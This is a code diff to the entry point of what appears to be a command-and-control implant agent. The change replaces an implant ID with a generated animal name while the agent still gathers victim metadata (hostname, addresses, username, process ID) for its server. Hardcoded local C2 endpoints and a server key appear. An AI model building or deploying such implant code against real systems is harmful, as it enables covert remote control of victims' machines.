@@ -48,11 +48,9 @@ namespace EntryPoint
 #if WINDOWS
             string connUrl = Agent.Properties.Resources.EndPoint;
             string serverKey = Agent.Properties.Resources.Key;
-            string implantId = Agent.Properties.Resources.Implant;
 #else
             string connUrl = AgentLinux.Resource.EndPoint.TrimEnd('*');
             string serverKey = AgentLinux.Resource.Key.TrimEnd('*');
-            string implantId = AgentLinux.Resource.Implant.TrimEnd('*');
 #endif
 #if DEBUG
             Trace.Listeners.Add(new TextWriterTraceListener(Console.Out));
@@ -61,7 +59,6 @@ namespace EntryPoint
 #if LOCAL
             connUrl = "http://127.0.0.1:2000";
             serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
-            implantId = GenerateName();
             //connUrl = "https://192.168.48.134:443";
             //connUrl = "http://192.168.48.134:2000";
             //connUrl = "pipe://127.0.0.1:Fractal";
@@ -87,7 +84,6 @@ namespace EntryPoint
 #if DEBUG
             Debug.WriteLine($"Endpoint is {connUrl}.");
             Debug.WriteLine($"ServerKey is {serverKey}.");
-            Debug.WriteLine($"Implant is {implantId}.");
 #endif
 
             if (!connexion.IsValid)
@@ -96,7 +92,7 @@ namespace EntryPoint
                 return;
             }
 
-            var metaData = GenerateMetadata(connexion.ToString(), implantId);
+            var metaData = GenerateMetadata(connexion.ToString());
 
 
             var configService = new ConfigService();
@@ -159,7 +155,7 @@ namespace EntryPoint
         }
 
 
-        static AgentMetadata GenerateMetadata(string endpoint, string implantId)
+        static AgentMetadata GenerateMetadata(string endpoint)
         {
             var hostname = Dns.GetHostName();
             var addresses = Dns.GetHostAddressesAsync(hostname).Result;
@@ -222,7 +218,7 @@ namespace EntryPoint
             AgentMetadata metadata = new AgentMetadata()
                 {
                     Id = Agent.ShortGuid.NewGuid(),
-                    ImplantId = implantId,
+                    Name = GenerateName(),
                     Hostname = hostname,
                     UserName = userName,
                     ProcessId = process.Id,
@@ -239,7 +235,7 @@ namespace EntryPoint
 
             return metadata;
         }
-#if LOCAL
+
         public static string GenerateName()
         {
             var animals = new List<string>
@@ -279,6 +275,6 @@ namespace EntryPoint
 
             return result;
         }
-#endif
+
     }
 }
